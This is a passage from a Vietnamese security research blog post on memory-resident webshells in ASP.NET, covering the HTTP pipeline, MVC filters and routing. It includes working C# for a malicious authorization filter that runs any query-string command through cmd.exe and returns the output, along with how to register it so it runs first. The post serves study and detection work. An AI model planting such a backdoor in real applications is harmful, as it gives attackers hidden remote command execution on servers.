<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="DÆ°á»›i sá»± hÆ°á»›ng dáº«n sÃ¡t sao cá»§a ngÆ°á»i anh - ngÆ°á»i tháº§y Jang, mÃ¬nh Ä‘Ã£ báº£o vá»‡ thÃ nh cÃ´ng Ä‘á»“ Ã¡n tá»‘t nghiá»‡p Ä‘á» tÃ i Memory Webshell trong .NET vá»›i káº¿t quáº£ khÃ¡ tá»‘t. PhÃ¨ phÆ°á»¡n 1 thÃ¡ng khÃ´ng viáº¿t lÃ¡ch, mÃ¬nh nghÄ© mÃ¬nh nÃªn viáº¿t láº¡i gÃ¬ Ä‘Ã³ thay vÃ¬ chá»‰ lÆ°u trá»¯ kiáº¿n thá»©c trong quyá»ƒn Ä‘á»“ Ã¡n ná»™p cho nhÃ  trÆ°á»ng, vá»«a Ä‘á»ƒ cá»§ng cá»‘ kiáº¿n thá»©c, vá»«a Ä‘á»ƒ tiá»‡n search láº¡i sau nÃ y.\nÄÃ¢y sáº½ lÃ  bÃ i viáº¿t trÃ¬nh bÃ y nhá»¯ng hiá»ƒu biáº¿t cá»§a mÃ¬nh trong quÃ¡ trÃ¬nh há»c há»i vÃ  nghiÃªn cá»©u ká»¹ thuáº­t Memshell trong ASP.NET, áº£nh hÆ°á»Ÿng náº·ng ná» tá»« yzddmr6 vÃ  endy.\n"><title>Memory Webshell in .NET Framework</title><link rel=canonical href=https://kev1n1203.github.io/p/memshell-dotnet/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="Memory Webshell in .NET Framework"><meta property='og:description' content="DÆ°á»›i sá»± hÆ°á»›ng dáº«n sÃ¡t sao cá»§a ngÆ°á»i anh - ngÆ°á»i tháº§y Jang, mÃ¬nh Ä‘Ã£ báº£o vá»‡ thÃ nh cÃ´ng Ä‘á»“ Ã¡n tá»‘t nghiá»‡p Ä‘á» tÃ i Memory Webshell trong .NET vá»›i káº¿t quáº£ khÃ¡ tá»‘t. PhÃ¨ phÆ°á»¡n 1 thÃ¡ng khÃ´ng viáº¿t lÃ¡ch, mÃ¬nh nghÄ© mÃ¬nh nÃªn viáº¿t láº¡i gÃ¬ Ä‘Ã³ thay vÃ¬ chá»‰ lÆ°u trá»¯ kiáº¿n thá»©c trong quyá»ƒn Ä‘á»“ Ã¡n ná»™p cho nhÃ  trÆ°á»ng, vá»«a Ä‘á»ƒ cá»§ng cá»‘ kiáº¿n thá»©c, vá»«a Ä‘á»ƒ tiá»‡n search láº¡i sau nÃ y.\nÄÃ¢y sáº½ lÃ  bÃ i viáº¿t trÃ¬nh bÃ y nhá»¯ng hiá»ƒu biáº¿t cá»§a mÃ¬nh trong quÃ¡ trÃ¬nh há»c há»i vÃ  nghiÃªn cá»©u ká»¹ thuáº­t Memshell trong ASP.NET, áº£nh hÆ°á»Ÿng náº·ng ná» tá»« yzddmr6 vÃ  endy.\n"><meta property='og:url' content='https://kev1n1203.github.io/p/memshell-dotnet/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='dotNet'><meta property='article:published_time' content='2026-01-12T00:00:00+00:00'><meta property='article:modified_time' content='2026-01-12T00:00:00+00:00'><meta name=twitter:title content="Memory Webshell in .NET Framework"><meta name=twitter:description content="DÆ°á»›i sá»± hÆ°á»›ng dáº«n sÃ¡t sao cá»§a ngÆ°á»i anh - ngÆ°á»i tháº§y Jang, mÃ¬nh Ä‘Ã£ báº£o vá»‡ thÃ nh cÃ´ng Ä‘á»“ Ã¡n tá»‘t nghiá»‡p Ä‘á» tÃ i Memory Webshell trong .NET vá»›i káº¿t quáº£ khÃ¡ tá»‘t. PhÃ¨ phÆ°á»¡n 1 thÃ¡ng khÃ´ng viáº¿t lÃ¡ch, mÃ¬nh nghÄ© mÃ¬nh nÃªn viáº¿t láº¡i gÃ¬ Ä‘Ã³ thay vÃ¬ chá»‰ lÆ°u trá»¯ kiáº¿n thá»©c trong quyá»ƒn Ä‘á»“ Ã¡n ná»™p cho nhÃ  trÆ°á»ng, vá»«a Ä‘á»ƒ cá»§ng cá»‘ kiáº¿n thá»©c, vá»«a Ä‘á»ƒ tiá»‡n search láº¡i sau nÃ y.\nÄÃ¢y sáº½ lÃ  bÃ i viáº¿t trÃ¬nh bÃ y nhá»¯ng hiá»ƒu biáº¿t cá»§a mÃ¬nh trong quÃ¡ trÃ¬nh há»c há»i vÃ  nghiÃªn cá»©u ká»¹ thuáº­t Memshell trong ASP.NET, áº£nh hÆ°á»Ÿng náº·ng ná» tá»« yzddmr6 vÃ  endy.\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung Háº­u - ThÃ nh viÃªn Äƒn háº¡i táº¡i KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#http-life-cycle>HTTP Life Cycle</a></li><li><a href=#filter-memory-webshell>Filter Memory Webshell</a><ol><li><a href=#filter-in-net>Filter in .NET</a></li><li><a href=#filter-comparison>Filter Comparison</a></li><li><a href=#deploy>Deploy</a></li></ol></li><li><a href=#route-memory-webshell>Route Memory Webshell</a><ol><li><a href=#logic-add-route>Logic Add Route</a></li><li><a href=#tá»±-implement-routebase>Tá»± Implement RouteBase:</a></li><li><a href=#sá»­-dá»¥ng-systemwebroutingroute>Sá»­ dá»¥ng System.Web.Routing.Route</a></li></ol></li><li><a href=#httplistener-memory-webshell>HTTPListener Memory Webshell</a><ol><li><a href=#phÃ¢n-tÃ­ch>PhÃ¢n tÃ­ch</a></li><li><a href=#deploy-1>Deploy</a></li><li><a href=#giá»›i-háº¡n>Giá»›i Háº¡n</a></li></ol></li><li><a href=#virtualpath-memory-webshell>VirtualPath Memory Webshell</a><ol><li><a href=#not-so-memshell>Not so memshell</a></li><li><a href=#virtualpath-at-its-finest>VirtualPath at its finest</a></li></ol></li><li><a href=#httpmodule-memory-webshell>HTTPModule Memory Webshell</a><ol><li><a href=#httpapplication-reuse-mechanism>HttpApplication Reuse Mechanism</a></li><li><a href=#logic-add-eventhandler-into-httpmodule>Logic Add EventHandler into HttpModule</a></li><li><a href=#deploy-2>Deploy</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/memshell-dotnet/>Memory Webshell in .NET Framework</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2026-01-12T00:00:00Z>Jan 12, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>25 minute read</time></div></footer></div></header><section class=article-content><p>DÆ°á»›i sá»± hÆ°á»›ng dáº«n sÃ¡t sao cá»§a ngÆ°á»i anh - ngÆ°á»i tháº§y <a class=link href=https://medium.com/@testbnull target=_blank rel=noopener>Jang</a>, mÃ¬nh Ä‘Ã£ báº£o vá»‡ thÃ nh cÃ´ng Ä‘á»“ Ã¡n tá»‘t nghiá»‡p Ä‘á» tÃ i Memory Webshell trong .NET vá»›i káº¿t quáº£ khÃ¡ tá»‘t. PhÃ¨ phÆ°á»¡n 1 thÃ¡ng khÃ´ng viáº¿t lÃ¡ch, mÃ¬nh nghÄ© mÃ¬nh nÃªn viáº¿t láº¡i gÃ¬ Ä‘Ã³ thay vÃ¬ chá»‰ lÆ°u trá»¯ kiáº¿n thá»©c trong quyá»ƒn Ä‘á»“ Ã¡n ná»™p cho nhÃ  trÆ°á»ng, vá»«a Ä‘á»ƒ cá»§ng cá»‘ kiáº¿n thá»©c, vá»«a Ä‘á»ƒ tiá»‡n search láº¡i sau nÃ y.<br>ÄÃ¢y sáº½ lÃ  bÃ i viáº¿t trÃ¬nh bÃ y nhá»¯ng hiá»ƒu biáº¿t cá»§a mÃ¬nh trong quÃ¡ trÃ¬nh há»c há»i vÃ  nghiÃªn cá»©u ká»¹ thuáº­t Memshell trong <code>ASP.NET</code>, áº£nh hÆ°á»Ÿng náº·ng ná» tá»« <a class=link href=https://yzddmr6.com/ target=_blank rel=noopener>yzddmr6</a> vÃ  <a class=link href=https://endy.gitbook.io/endys-notes target=_blank rel=noopener>endy</a>.</p><h2 id=http-life-cycle>HTTP Life Cycle</h2><p>Trong mÃ´i trÆ°á»ng .NET Framework, webapp sáº½ Ä‘Æ°á»£c deploy dÆ°á»›i web server lÃ  IIS (Internet Information Services) vÃ  thÆ°á»ng code theo 2 dáº¡ng: WebForms vÃ  WebMVC. Táº¥t cáº£ cÃ¡c request dÃ¹ Ä‘Æ°á»£c code theo kiá»ƒu nÃ o Ä‘á»u sáº½ Ä‘i qua má»™t chuá»—i cÃ¡c sá»± kiá»‡n chuyÃªn biá»‡t Ä‘á»ƒ xá»­ lÃ½ yÃªu cáº§u Ä‘áº¿n trong ASP.NET, gá»i lÃ  HTTP Pipeline. MÃ´ hÃ¬nh cá»§a HTTP pipeline cÃ³ thá»ƒ Ä‘Æ°á»£c mÃ´ táº£ nhÆ° sau:<br><img src=https://hackmd.io/_uploads/rJMJibiHZx.png loading=lazy alt=image><br>QuÃ¡ trÃ¬nh nÃ y Ä‘i qua má»™t sá»‘ bÆ°á»›c:</p><ul><li>Nháº­n HTTP request tá»« ngÆ°á»i dÃ¹ng, IIS sá»­ dá»¥ng native dll Aspnet_isapi.dll Ä‘á»ƒ báº¯t Ä‘áº§u quÃ¡ trÃ¬nh xá»­ lÃ½, Ä‘Æ°a request vÃ o má»™t instance cá»§a class HttpRuntime.</li><li>HttpRuntime class gá»i Ä‘áº¿n HttpApllicationFactory yÃªu cáº§u cáº¥p instance HttpApplication Ä‘á»ƒ xá»­ lÃ½ request, khá»Ÿi táº¡o pipeline, má»—i instance chá»©a cÃ¡c HttpModule - nÆ¡i kiá»ƒm tra vÃ  thay Ä‘á»•i ná»™i dung cá»§a HTTP request thÃ´ng qua sá»± kiá»‡n cÃ³ thá»© tá»± nháº¥t Ä‘á»‹nh. Request Ä‘Æ°á»£c duyá»‡t qua nhiá»u sá»± kiá»‡n, gá»i Ä‘Ã¢y lÃ  HTTP Pipeline</li><li>Khi gá»i Ä‘áº¿n sá»± kiá»‡n PreRequestHandlerExecute, IIS sáº½ chá»n ra HttpHandler tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½ thá»±c táº¿ vÃ  render pháº£n há»“i vá» cho client. VÃ­ dá»¥ nhÆ° MvcHandler trong Web MVC vÃ  PageRouteHandler trong Web Forms.</li><li>HTTP Pipeline sá»­ dá»¥ng object HttpContext Ä‘á»ƒ biá»ƒu thá»‹ cho HTTP request hiá»‡n táº¡i, object nÃ y Ä‘Æ°á»£c truyá»n vÃ o khi khá»Ÿi táº¡o HttpApplication, Ä‘i qua quÃ¡ trÃ¬nh xá»­ lÃ½ cá»§a HttpModule cÅ©ng nhÆ° Ä‘Æ°á»£c Ä‘Æ°a xuá»‘ng HttpHandler táº¡i method ProcessRequest.</li></ul><p>Viá»‡c deploy memshell sáº½ sá»­ dá»¥ng cÃ¡c component cÃ³ kháº£ nÄƒng xá»­ lÃ½ vÃ  kiá»ƒm soÃ¡t HTTP Request/Response trong pipeline, nÃªn Ä‘Ã¢y lÃ  nhá»¯ng kiáº¿n thá»©c ná»n táº£ng cáº§n pháº£i biáº¿t trÆ°á»›c khi tÃ¬m hiá»ƒu Ä‘áº¿n memshell.</p><h2 id=filter-memory-webshell>Filter Memory Webshell</h2><p>Sau khi chá»n Ä‘Æ°á»£c MVCHandler Ä‘á»ƒ xá»­ lÃ½ request, mÃ´ hÃ¬nh ASP.NET MVC sáº½ Ä‘i qua class Controller - cÃ³ nhiá»‡m vá»¥ chá»n ra ActionMethod Ä‘Ãºng Ä‘á»ƒ thá»±c thi request vÃ  tráº£ káº¿t quáº£ vá» cho client. NhÆ°ng trÆ°á»›c Ä‘Ã³ thÃ¬ MVC cung cáº¥p cho ngÆ°á»i dÃ¹ng cÆ¡ cháº¿ Filter â€“ cÃ³ chá»©c nÄƒng &ldquo;filter&rdquo; cÃ¡c request tÆ°Æ¡ng tá»± nhÆ° class Filter cá»§a Java Tomcat, cÃ³ kháº£ nÄƒng thÃªm code xá»­ lÃ½ logic, log lá»—i, kiá»ƒm tra xÃ¡c thá»±c trÆ°á»›c khi request Ä‘áº¿n bÆ°á»›c Action Method.<br><img src=https://hackmd.io/_uploads/rJsG0-sHWl.png loading=lazy alt=image><br>TÃ­nh nÄƒng nÃ y náº±m trong MVC Middleware chá»‰ thuá»™c ASP.NET MVC, nÃªn Ä‘á»ƒ triá»ƒn khai Ä‘Æ°á»£c thÃ¬ webapps cáº§n Ä‘Æ°á»£c code theo kiá»ƒu MVC</p><h3 id=filter-in-net>Filter in .NET</h3><p>Khi táº¡o 1 project web MVC sáº½ xuáº¥t hiá»‡n 3 thÆ° má»¥c Models â€“ Views â€“ Controllers, ngoÃ i ra tá»“n táº¡i má»™t sá»‘ thÆ° má»¥c máº·c Ä‘á»‹nh khÃ¡c vá»›i cÃ¡c chá»©c nÄƒng chá»§ yáº¿u Ä‘á»ƒ lÆ°u trá»¯ nhÆ° App_Data, Content, Scripts,&mldr; Äáº·c biá»‡t chÃº Ã½ Ä‘áº¿n file Global.asax, file nÃ y sáº½ Ä‘Æ°á»£c gá»i 1 láº§n khi á»©ng dá»¥ng web báº¯t Ä‘áº§u khá»Ÿi cháº¡y, chá»©a cÃ¡c thÃ nh pháº§n cÆ¡ báº£n cáº§n pháº£i Ä‘Æ°á»£c khai bÃ¡o Ä‘á»ƒ start up web service, Ä‘Ã³ lÃ  cÃ¡c filters, routes vÃ  bundles:<br><img src=https://hackmd.io/_uploads/rJ7jbfiHWl.png loading=lazy alt=image><br>Táº¡i file FilterConfig.cs náº±m trong App_Start chá»©a cÃ¢u lá»‡nh thÃªm filter tá»± Ä‘á»‹nh nghÄ©a vÃ o GlobalFilterCollection, máº·c Ä‘á»‹nh cÃ³ filter HandleErrorAttribute Ä‘á»ƒ xá»­ lÃ½ lá»—i<br><img src=https://hackmd.io/_uploads/ByByzMjr-x.png loading=lazy alt=image><br>CÃ¡c filter thá»±c cháº¥t sáº½ Ä‘Æ°á»£c thÃªm táº¡i class GlobalFilterCollection thuá»™c namespace System.Web.Mvc:<br><img src=https://hackmd.io/_uploads/BkHWzzorWg.png loading=lazy alt=image><br>Vá» cÆ¡ báº£n, quÃ¡ trÃ¬nh Add sáº½ diá»…n ra nhÆ° sau:</p><ul><li>Táº¡o má»™t <code>List&lt;Filter></code> Ä‘á»ƒ lÆ°u trá»¯ Filter dÆ°á»›i dáº¡ng list, lÆ°u táº¡i thuá»™c tÃ­nh <code>_filters</code></li><li>Kiá»ƒm tra Filter Ä‘Æ°á»£c thÃªm vÃ o táº¡i method ValidateFilterInstance, náº¿u khÃ´ng thá»a mÃ£n sáº½ tráº£ vá» lá»—i</li><li>ThÃªm Filter vÃ o List khai bÃ¡o trÆ°á»›c Ä‘Ã³, náº¿u Filter khÃ´ng Ä‘i kÃ¨m giÃ¡ trá»‹ order sáº½ táº¡o order vá»›i kiá»ƒu dá»¯ liá»‡u integer vÃ  giÃ¡ trá»‹ máº·c Ä‘á»‹nh lÃ  null</li></ul><p>Method ValidateFilterInstance Ä‘Æ°á»£c gá»i Ä‘á»ƒ xem filter cÃ³ implement cÃ¡c interface cá»§a má»™t filter há»£p lá»‡ hay khÃ´ng:<br><img src=https://hackmd.io/_uploads/BymLzzirbl.png loading=lazy alt=image><br>CÃ¡c filter há»£p lá»‡ gá»“m cÃ³:</p><ul><li>Authorization filters: phá»¥c vá»¥ xÃ¡c thá»±c vÃ  á»§y quyá»n trÆ°á»›c khi bÆ°á»›c vÃ o cÃ¡c action cá»§a controller</li><li>Action filters: chá»©a logic mÃ  Ä‘Æ°á»£c thá»±c thi trÆ°á»›c vÃ  sau khi thá»±c thi Controller</li><li>Result filters: thá»±c thi trÆ°á»›c vÃ  sau khi render View</li><li>Exception filters: log, handle vÃ  catch cÃ¡c exception xáº£y ra trong quÃ¡ trÃ¬nh Controller hoáº·c View cháº¡y</li></ul><p>Trong sá»‘ cÃ¡c filter nÃ y thÃ¬ Authorization filters Ä‘Æ°á»£c gá»i Ä‘áº§u tiÃªn. MÃ¬nh sáº½ Æ°u tiÃªn chá»n nhá»¯ng filter sá»›m nháº¥t Ä‘á»ƒ inject</p><h3 id=filter-comparison>Filter Comparison</h3><p>Khi tá»“n táº¡i 2 filters implements cÃ¹ng má»™t interface, thá»© tá»± thá»±c thi sáº½ Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh thÃ´ng qua 2 tham sá»‘: Order vÃ  Scope<br><img src=https://hackmd.io/_uploads/rJ3tMfirZx.png loading=lazy alt=image><br>Náº¿u chÆ°a khai bÃ¡o thÃ¬ máº·c Ä‘á»‹nh Order sáº½ Ä‘Æ°á»£c gÃ¡n lÃ  -1. CÃ²n giÃ¡ trá»‹ scope Ä‘Æ°á»£c biá»ƒu diá»…n nhÆ° sau:<br><img src=https://hackmd.io/_uploads/SkaizMsSWx.png loading=lazy alt=image><br>Logic so sÃ¡nh náº±m táº¡i class FilterComparer thuá»™c FilterProviderCollection:</p><ul><li>GiÃ¡ trá»‹ Order cÃ ng nhá» thÃ¬ cÃ ng Ä‘Æ°á»£c Æ°u tiÃªn thá»±c thi</li><li>Khi giÃ¡ trá»‹ Order báº±ng nhau sáº½ xem xÃ©t Ä‘áº¿n giÃ¡ trá»‹ Scope. TÆ°Æ¡ng tá»± nhÆ° Order, giÃ¡ trá»‹ Scope cÃ ng nhá» thÃ¬ má»©c Ä‘á»™ Æ°u tiÃªn cÃ ng cao.<br><img src=https://hackmd.io/_uploads/rkypzfsS-e.png loading=lazy alt=image><br></li></ul><p>=> Chá»‰ cáº§n set giÃ¡ trá»‹ cho Filter.Order má»™t sá»‘ nguyÃªn nhá» hÆ¡n -1 lÃ  Ä‘Æ°á»£c.</p><h3 id=deploy>Deploy</h3><p>VÃ¬ class GlobalFilterCollection lÃ  public class nÃªn mÃ¬nh cÃ³ thá»ƒ gá»i Ä‘áº¿n mÃ  khÃ´ng cáº§n reflection, logic code sáº½ nhÆ° sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public class MalFilter : IAuthorizationFilter {
</span></span><span class=line><span class=cl>    public void OnAuthorization(AuthorizationContext filterContext){
</span></span><span class=line><span class=cl>        String cmd = filterContext.HttpContext.Request.QueryString[&#34;command&#34;]; 
</span></span><span class=line><span class=cl>        if (cmd != null){
</span></span><span class=line><span class=cl>            HttpResponseBase response = filterContext.HttpContext.Response;
</span></span><span class=line><span class=cl>            Process p = new Process();
</span></span><span class=line><span class=cl>            p.StartInfo.FileName = &#34;cmd.exe&#34;;
</span></span><span class=line><span class=cl>            p.StartInfo.Arguments = &#34;/c&#34; + cmd; 
</span></span><span class=line><span class=cl>            p.Start();
</span></span><span class=line><span class=cl>            byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
</span></span><span class=line><span class=cl>response.Write(System.Text.Encoding.Default.GetString(data));
</span></span><span class=line><span class=cl>            response.End();
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>GlobalFilters.Filters.Add(new MalFilter(), -10);
</span></span></code></pre></td></tr></table></div></div><p>Sau Ä‘Ã³ thÃ¬ mÃ¬nh cÃ³ thá»ƒ exec command vá»›i cÃ¡c Ä‘Æ°á»ng dáº«n há»£p lá»‡:<br><img src=https://hackmd.io/_uploads/SyzjVzoHZe.png loading=lazy alt=image><br>MÃ¬nh nÃ³i lÃ  Ä‘Æ°á»ng dáº«n há»£p lá»‡ bá»Ÿi vÃ¬ filter nÃ y khÃ´ng Ä‘Æ°á»£c call náº¿u path khÃ´ng tá»“n táº¡i, Ä‘Ã¢y cÅ©ng lÃ  1 lÆ°u Ã½ khi sá»­ dá»¥ng loáº¡i memshell nÃ y:<br><img src=https://hackmd.io/_uploads/rJM04zoSbl.png loading=lazy alt=image></p><h2 id=route-memory-webshell>Route Memory Webshell</h2><p>Tiáº¿p Ä‘áº¿n lÃ  ká»¹ thuáº­t Route, lá»£i dá»¥ng cÆ¡ cháº¿ routing Ä‘á»ƒ xá»­ lÃ½, cÆ¡ cháº¿ nÃ y lÃ  má»™t module hoáº¡t Ä‘á»™ng trong pipeline, Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ phá»¥c vá»¥ xá»­ lÃ½ URL khi cÃ³ request Ä‘áº¿n.<br>Cá»¥ thá»ƒ hÆ¡n, khi application event PostResolveRequestCache Ä‘Æ°á»£c gá»i trong request pipeline, ASP.NET Routing sáº½ kiá»ƒm tra Ä‘Æ°á»ng dáº«n cá»§a request Ä‘á»ƒ chuyá»ƒn cho HttpHandler phÃ¹ há»£p, rá»“i gá»­i lÃªn framework layer cao hÆ¡n tiáº¿p tá»¥c thá»±c thi:<br><img src=https://hackmd.io/_uploads/rJR3Hzjr-l.png loading=lazy alt=image></p><h3 id=logic-add-route>Logic Add Route</h3><p>File RouteConfig.cs máº·c Ä‘á»‹nh sá»­ dá»¥ng method MapRoute Ä‘á»ƒ Ä‘á»‹nh nghÄ©a Route cÃ³ trong á»©ng dá»¥ng web vá»›i tÃªn lÃ  Default:<br><img src=https://hackmd.io/_uploads/BJw88zor-e.png loading=lazy alt=image><br>ÄÃ¢y lÃ  cÃ¡ch mÃ  WebMVC sá»­ dá»¥ng Ä‘á»ƒ thÃªm vÃ  Ä‘á»‹nh nghÄ©a route má»›i, Ä‘i sÃ¢u vÃ o hÃ m MapRoute mÃ¬nh tháº¥y thá»±c cháº¥t nÃ³ Ä‘ang khá»Ÿi táº¡o thÃ´ng tin Route tá»« dá»¯ liá»‡u truyá»n vÃ o, cÃ²n hÃ m thá»±c sá»± thÃªm Route vÃ o RouteCollection náº±m táº¡i method Add thuá»™c namespace System.Web.Routing:<br><img src=https://hackmd.io/_uploads/B1jyDzsSbe.png loading=lazy alt=image><br>Method Add cáº§n 2 tham sá»‘. Tham sá»‘ name khÃ´ng quan trá»ng khi Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xem Ä‘Ã£ cÃ³ route nÃ o cÃ³ giÃ¡ trá»‹ name nÃ y chÆ°a. CÃ²n tham sá»‘ route Ä‘Æ°á»£c Ã©p kiá»ƒu vá» RouteBase lÃ  quan trá»ng nháº¥t. RouteBase lÃ  má»™t abstract class, Ä‘Æ°á»£c class System.Web.Routing.Route implement máº·c Ä‘á»‹nh.<br>NhÆ° váº­y sáº½ cÃ³ Ã­t nháº¥t 2 cÃ¡ch Ä‘á»ƒ triá»ƒn khai Route Memory Webshell, má»™t lÃ  tá»± táº¡o class Ä‘á»ƒ implement RouteBase, hai lÃ  sá»­ dá»¥ng System.Web.Routing.Route Ä‘Ã£ implement RouteBase sáºµn.</p><h3 id=tá»±-implement-routebase>Tá»± Implement RouteBase:</h3><p>VÃ¬ lÃ  